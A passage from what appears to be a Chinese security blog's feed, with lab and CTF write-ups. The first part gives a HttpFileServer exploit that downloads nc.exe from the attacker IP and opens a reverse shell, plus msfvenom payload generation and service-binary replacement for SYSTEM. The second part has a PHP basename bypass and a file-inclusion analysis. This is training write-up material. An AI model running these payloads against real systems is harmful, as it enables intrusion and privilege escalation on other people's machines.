Advanced.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 首先先要 暂停服务</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 服务暂停之后 才能对这个文件进行替换</span></span></span><br><span class="line"></span><br><span class="line">当前路径:C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe</span><br><span class="line"></span><br><span class="line">cd &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\&quot;</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</span><br><span class="line"></span><br><span class="line">Move-Item -Path &quot;C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe&quot; -Destination &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span><br><span class="line">sc start  相对服务的名字 </span><br><span class="line">直接get shell</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="非MSF-启动-非集成化脚本"><a href="#非MSF-启动-非集成化脚本" class="headerlink" title="非MSF 启动(非集成化脚本)"></a>非MSF 启动(非集成化脚本)</h3><h4 id="httpfileserver"><a href="#httpfileserver" class="headerlink" title="httpfileserver"></a>httpfileserver</h4><blockquote><p><a href="https://www.exploit-db.com/exploits/39161">先找到exp</a><br>修改 个人ip 和 端口</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">script_create</span>():</span><br><span class="line">urllib2.urlopen(<span class="string">&quot;http://&quot;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&quot;:&quot;</span>+sys.argv[<span class="number">2</span>]+<span class="string">&quot;/?search=%00&#123;.+&quot;</span>+save+<span class="string">&quot;.&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_script</span>():</span><br><span class="line">urllib2.urlopen(<span class="string">&quot;http://&quot;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&quot;:&quot;</span>+sys.argv[<span class="number">2</span>]+<span class="string">&quot;/?search=%00&#123;.+&quot;</span>+exe+<span class="string">&quot;.&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc_run</span>():</span><br><span class="line">urllib2.urlopen(<span class="string">&quot;http://&quot;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&quot;:&quot;</span>+sys.argv[<span class="number">2</span>]+<span class="string">&quot;/?search=%00&#123;.+&quot;</span>+exe1+<span class="string">&quot;.&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip_addr = <span class="string">&quot;10.11.69.232&quot;</span> <span class="comment">#local IP address</span></span><br><span class="line">local_port = <span class="string">&quot;9001&quot;</span> <span class="comment"># Local Port number</span></span><br><span class="line">vbs = <span class="string">&quot;C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F&quot;</span>+ip_addr+<span class="string">&quot;%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with&quot;</span></span><br><span class="line">save= <span class="string">&quot;save|&quot;</span> + vbs</span><br><span class="line">vbs2 = <span class="string">&quot;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&quot;</span></span><br><span class="line">exe= <span class="string">&quot;exec|&quot;</span>+vbs2</span><br><span class="line">vbs3 = <span class="string">&quot;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20&quot;</span>+ip_addr+<span class="string">&quot;%20&quot;</span>+local_port</span><br><span class="line">exe1= <span class="string">&quot;exec|&quot;</span>+vbs3</span><br><span class="line">script_create()</span><br><span class="line">execute_script()</span><br><span class="line">nc_run()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;&quot;[.]Something went wrong..!</span></span><br><span class="line"><span class="string">Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;</span></span><br><span class="line"><span class="string">Don&#x27;t forgot to change the Local IP address and Port number on the script&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="脚本利用"><a href="#脚本利用" class="headerlink" title="脚本利用"></a>脚本利用</h3><h5 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h5><blockquote><p>脚本向我们本地的web 服务器 请求 nc.exe </p></blockquote><h5 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png" alt="image.png">第二次</h5><blockquote><p>脚本向目标 弹一个反向shell回来</p></blockquote><p>下载 nc.exe 并且 搭建web服务</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png" alt="image.png"></p><h3 id="Get-System"><a href="#Get-System" class="headerlink" title="Get_System"></a>Get_System</h3><blockquote><p>今天继续找一个自动化信息收集脚本 winpeas</p></blockquote><table><thead><tr><th>windwos 提权</th><th><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%ACWinpeas">自动化脚本Winpeas</a></th></tr></thead></table><blockquote><p>使用web服务器将exe传送到 目标机器<br>直接运行</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Interesting Services -non Microsoft-</span><br><span class="line">� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services              </span><br><span class="line">    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected</span><br><span class="line">    File Permissions: bill [WriteData/CreateFiles]</span><br><span class="line">    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])                </span><br><span class="line">    Advanced SystemCare Service</span><br></pre></td></tr></table></figure><blockquote><p>依旧是 这个 文件<br>服务 我们可以直接 创建一个exe来替代他</p></blockquote><h3 id="载荷投递-1"><a href="#载荷投递-1" class="headerlink" title="载荷投递"></a>载荷投递</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  -f exe-service -e x86/shikata_ga_nai  -o ASCService.exe</span><br></pre></td></tr></table></figure><blockquote><p>停止服务 AdvancedSystemCareService9<br>sc stop AdvancedSystemCareService9<br>直接删除可执行文件ASCService.exe<br>直接上传我们的自定义<br>ASCService.exe</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://10.11.69.232:8080/ASCService.exe&quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;ASCService.exe&quot;</span>  </span><br></pre></td></tr></table></figure><h3 id="get-system"><a href="#get-system" class="headerlink" title="get_system"></a>get_system</h3><blockquote><p>sc start AdvancedSystemCareService9</p></blockquote><p>开启监听 nc -nvlp 4444</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>这个靶场还是比较简单的 主要是 使用了两种方式让你学会如何利用软件进入 一台机器</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf刷题记录3</title>
      <link href="/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
      <url>/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215541.png" alt="image.png"></p><h3 id="长城杯flow"><a href="#长城杯flow" class="headerlink" title="长城杯flow"></a>长城杯flow</h3><blockquote><p>根据题目提示 httpattackflow  直接过滤http流量<br>md 我是hanhan   比赛时候脑子 秀逗了<br>直接看第一个包就是 cmd 的木马   md 真的是傻了</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240430142353.png" alt="image.png"></p><h2 id="镜像取证"><a href="#镜像取证" class="headerlink" title="镜像取证"></a>镜像取证</h2><h4 id="Disk-disk-sleuth"><a href="#Disk-disk-sleuth" class="headerlink" title="Disk, disk, sleuth!"></a>Disk, disk, sleuth!</h4><blockquote><p>直接 strings -a -t x | grep “pico”<br>直接查找flag</p></blockquote><h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><blockquote></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;  </span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));  </span><br><span class="line">  <span class="keyword">exit</span>();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$secret </span>= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;  <span class="variable">$guess </span>= (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];  </span><br><span class="line">  <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;    <span class="variable">$message </span>= <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;    <span class="variable">$message </span>= <span class="string">&#x27;Wrong.&#x27;</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;  </span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;  </span><br><span class="line">  &lt;head&gt;  </span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;  </span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;  </span><br><span class="line">  &lt;/head&gt;  </span><br><span class="line">  &lt;body&gt;  </span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;  </span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;  </span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;  </span></span><br><span class="line"><span class="string">    &lt;hr&gt;  </span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;  </span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;  </span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;  </span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;  </span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;  </span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;  </span></span><br><span class="line"><span class="string">    &lt;/form&gt;  </span></span><br><span class="line"><span class="string">  &lt;/body&gt;  </span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h5 id="解释"><a href="#解释" class="headerlink" title="解释:"></a>解释:</h5><blockquote><p>$_SERVER[‘PHP_SELF’]  获取当前url的路径<br>匹配到例如.php 之后则会舍弃php后面的url 路径<br>也就是说  index.php 和 index.php&#x2F;1.php  效果是一样的</p></blockquote><p>preg_match(‘&#x2F;config.php/*$&#x2F;i’, $_SERVER[‘PHP_SELF’])<br>这个匹配的是config.php&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;….<br>但是highlight_file(basename($_SERVER[‘PHP_SELF’]<br>这个语句 也是利用了SERVER 这种 获取url<br>同时basename是截取最后一个路径的文件 但是如果识别 到不可识别的字符例如<br>%ff  那么我们就可以 再往前 截取一个文件 </p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><blockquote><p>***URL     index.php&#x2F;config.php&#x2F;%ff<br>由于  $  因此她不会匹配到 同时basename还会截取 config.php</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240506135344.png" alt="image.png"></p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！ 注意：得到的 flag 请包上 flag{} 提交</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240506135344.png" alt="image.png"></p><p>直接就是5463</p><p>打开之后一眼 brainfuck    </p><h2 id="加入给我三天光明"><a href="#加入给我三天光明" class="headerlink" title="加入给我三天光明"></a>加入给我三天光明</h2><blockquote><p>还真是盲文 这确实是盲文<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240506162920.png" alt="image.png"></p></blockquote><p>kmdonowg  直接对应找到盲文<br>解开 rar 压缩包<br>听声音就是摩斯密码<br>…. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. –.- ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><blockquote><p>常见信息<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240506171918.png" alt="image.png"></p></blockquote><p>报错信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**Warning**: include(meowers&#x27;.php): failed to open stream: No such file or directory in **/var/www/html/index.php** on line **37**  </span><br><span class="line">警告：include（meowers&#x27;.php）：无法打开流：第 37 行的 /var/www/html/index.php 中没有这样的文件或目录  </span><br><span class="line">  </span><br><span class="line">**Warning**: include(): Failed opening &#x27;meowers&#x27;.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in **/var/www/html/index.php** on line **37**</span><br></pre></td></tr></table></figure><blockquote><p>一眼 是文件包含 这个加了后缀 可能需要有一些截断的绕过手段<br>但是我想到可以直接伪协议 构造语句进行读取 文件<br>读了三个文件</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;Images that spark joy&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/material.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">page</span>-<span class="title">layout</span> <span class="title">mdl</span>-<span class="title">layout</span> <span class="title">mdl</span>-<span class="title">layout</span>--<span class="title">fixed</span>-<span class="title">header</span> <span class="title">mdl</span>-<span class="title">js</span>-<span class="title">layout</span> <span class="title">mdl</span>-<span class="title">color</span>--<span class="title">grey</span>-100&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">header</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">header</span> <span class="title">mdl</span>-<span class="title">layout__header</span> <span class="title">mdl</span>-<span class="title">layout__header</span>--<span class="title">scroll</span> <span class="title">mdl</span>-<span class="title">color</span>--<span class="title">grey</span>-100 <span class="title">mdl</span>-<span class="title">color</span>-<span class="title">text</span>--<span class="title">grey</span>-800&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">layout__header</span>-<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">layout</span>-<span class="title">title</span>&quot;&gt;<span class="title">Had</span> <span class="title">a</span> <span class="title">bad</span> <span class="title">day</span>?&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">layout</span>-<span class="title">spacer</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">ribbon</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">main</span> <span class="title">mdl</span>-<span class="title">layout__content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">container</span> <span class="title">mdl</span>-<span class="title">grid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">cell</span> <span class="title">mdl</span>-<span class="title">cell</span>--2-<span class="title">col</span> <span class="title">mdl</span>-<span class="title">cell</span>--<span class="title">hide</span>-<span class="title">tablet</span> <span class="title">mdl</span>-<span class="title">cell</span>--<span class="title">hide</span>-<span class="title">phone</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">content</span> <span class="title">mdl</span>-<span class="title">color</span>--<span class="title">white</span> <span class="title">mdl</span>-<span class="title">shadow</span>--4<span class="title">dp</span> <span class="title">content</span> <span class="title">mdl</span>-<span class="title">color</span>-<span class="title">text</span>--<span class="title">grey</span>-800 <span class="title">mdl</span>-<span class="title">cell</span> <span class="title">mdl</span>-<span class="title">cell</span>--8-<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">crumbs</span> <span class="title">mdl</span>-<span class="title">color</span>-<span class="title">text</span>--<span class="title">grey</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h3</span>&gt;<span class="title">Cheer</span> <span class="title">up</span>!&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">Did</span> <span class="title">you</span> <span class="title">have</span> <span class="title">a</span> <span class="title">bad</span> <span class="title">day</span>? <span class="title">Did</span> <span class="title">things</span> <span class="title">not</span> <span class="title">go</span> <span class="title">your</span> <span class="title">way</span> <span class="title">today</span>? <span class="title">Are</span> <span class="title">you</span> <span class="title">feeling</span> <span class="title">down</span>? <span class="title">Pick</span> <span class="title">an</span> <span class="title">option</span> <span class="title">and</span> <span class="title">let</span> <span class="title">the</span> <span class="title">adorable</span> <span class="title">images</span> <span class="title">cheer</span> <span class="title">you</span> <span class="title">up</span>!</span></span><br><span class="line"><span class="class">              &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">include</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">$<span class="title">file</span> = $<span class="title">_GET</span>[&#x27;<span class="title">category</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">file</span>))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">          &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span> id=<span class="string">&quot;choice&quot;</span>&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=<span class="string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> name=<span class="string">&quot;category&quot;</span> value=<span class="string">&quot;woofers&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mdl</span>-<span class="title">button</span> <span class="title">mdl</span>-<span class="title">button</span>--<span class="title">colored</span> <span class="title">mdl</span>-<span class="title">button</span>--<span class="title">raised</span> <span class="title">mdl</span>-<span class="title">js</span>-<span class="title">button</span> <span class="title">mdl</span>-<span class="title">js</span>-<span class="title">ripple</span>-<span class="title">effect</span>&quot; <span class="title">data</span>-<span class="title">upgraded</span>=&quot;,<span class="title">MaterialButton</span>,<span class="title">MaterialRipple</span>&quot;&gt;<span class="title">Woofers</span>&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">button__ripple</span>-<span class="title">container</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">ripple</span> <span class="title">is</span>-<span class="title">animating</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>: 189.356<span class="title">px</span>; <span class="title">height</span>: 189.356<span class="title">px</span>; <span class="title">transform</span>: <span class="title">translate</span>(-50%, -50%) <span class="title">translate</span>(31<span class="title">px</span>, 25<span class="title">px</span>);&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">button</span> <span class="title">onclick</span>=&quot;<span class="title">document</span>.<span class="title">getElementById</span>(&#x27;<span class="title">choice</span>&#x27;).<span class="title">submit</span>();&quot; <span class="title">name</span>=&quot;<span class="title">category</span>&quot; <span class="title">value</span>=&quot;<span class="title">meowers</span>&quot; <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">button</span> <span class="title">mdl</span>-<span class="title">button</span>--<span class="title">colored</span> <span class="title">mdl</span>-<span class="title">button</span>--<span class="title">raised</span> <span class="title">mdl</span>-<span class="title">js</span>-<span class="title">button</span> <span class="title">mdl</span>-<span class="title">js</span>-<span class="title">ripple</span>-<span class="title">effect</span>&quot; <span class="title">data</span>-<span class="title">upgraded</span>=&quot;,<span class="title">MaterialButton</span>,<span class="title">MaterialRipple</span>&quot;&gt;<span class="title">Meowers</span>&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">button__ripple</span>-<span 